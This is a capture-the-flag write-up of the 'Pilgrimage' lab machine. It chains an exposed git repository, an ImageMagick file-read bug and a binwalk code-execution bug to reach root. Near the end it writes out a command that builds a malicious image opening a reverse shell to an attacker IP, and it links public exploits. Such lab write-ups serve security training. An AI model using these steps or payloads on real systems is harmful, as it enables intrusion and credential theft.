---
title: Pilgrimage
date: 2023-11-25
published: true
categories: ["CTF"]
tags: ["ctf",  "git", "CVE-2022-44268", "CVE-2022-4510"]
---
# Pilgrimage
This was an easy  box that featured an unprotected git repository that we could use to see that it is using vulnerable
software that we can use to read a sensitive file containing a password and then ssh into the box. Then we see that root 
is running a custom script that was executing a vulnerable version of binwalk that we could use to get a shell as root.
## Recon
### nmap
We see the ports 22 and 80 are open, so the only attack vector is the website, so we can go to the website.
![img.png](/assets/img/pilgrimage/img.png)

### port 80
We see that there is a host name we need to add to /etc/hosts before we can reach the website. We also can then 
fuzz for subdomains but that doesn't give us anything, so we can leave this and fuzz for subdomains.

![img_1.png](/assets/img/pilgrimage/img_1.png)

We see on the ffuf results there is a .git directory that we can access, so we can use a tool like 
[git_dumper](https://github.com/arthaud/git-dumper) to get all
the files that are stored in the git repository and then analyze the source code.

![img_2.png](/assets/img/pilgrimage/img_2.png)

We see that in the git files there is the application called magick which is an application that does image processing 
and if we look at the version we see that the version is 7.10-0-49 and that is vulnerable to
[lfi](https://www.exploit-db.com/exploits/51261) which we can use to read sensitive files.

![img_3.png](/assets/img/pilgrimage/img_3.png)

### LFI

If we go to the website we see that we register an account, and then we can upload an image that gets resized likely using 
the magick application, so we can use the lfi to read files. If we look at the source code and in login.php the database 
that is being used is stored in /var/db/pilgrimage so if we can read that we might be able to get a password to log in with ssh, so we 
upload the malicious image which gets resized and triggers the exploit when it is resized. Then we can `wget http://pilgrimage.htb/shrunk/image_id`
to get the image, and then we can read the data that using `identify -verbose image_name.png`
and then converting the hex to the ascii equivalent to see if there is anything interesting.

![img_4.png](/assets/img/pilgrimage/img_4.png)

![img_5.png](/assets/img/pilgrimage/img_5.png)

In the database file we see that there is a username of emily and the password that we can try to use to ssh into the box
which is successful.

![img_6.png](/assets/img/pilgrimage/img_6.png)
## Shell as Root
If we look at sudo -l we see that we cant run anything as sudo we can and there is no special suid programs that we can
exploit. We can upload pspy64 on the box and see what processes are running on the box and see that there is a custom
malware.sh script that is being as root.

![img_7.png](/assets/img/pilgrimage/img_7.png)

The script is running binwalk on files uploaded to /var/www/pilgrimage.htb/shrunk, so we can look at the version on binwalk
to see what version of binwalk is being used on the box.
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

we see running `/usr/local/bin/binwalk` the version of binwalk is v2.3.2 and there is a 
[rce](https://www.exploit-db.com/exploits/51249) on this version. Which we can use to get privileges as root. If we run 
the `python3 exp.py /var/www/pilgrimage.htb/shrunk/6561bb2e1406b.png 10.10.14.3 1234
` with exp.py being the exploit from the link earlier. Then we can copy the created image to the /var/www/pilgrimage.htb/shrunk directory
so that it triggers the inotify event create and executes the script and gives us a root privileges because the image is
passed into binwalk and gives us rce.

![img_8.png](/assets/img/pilgrimage/img_8.png)
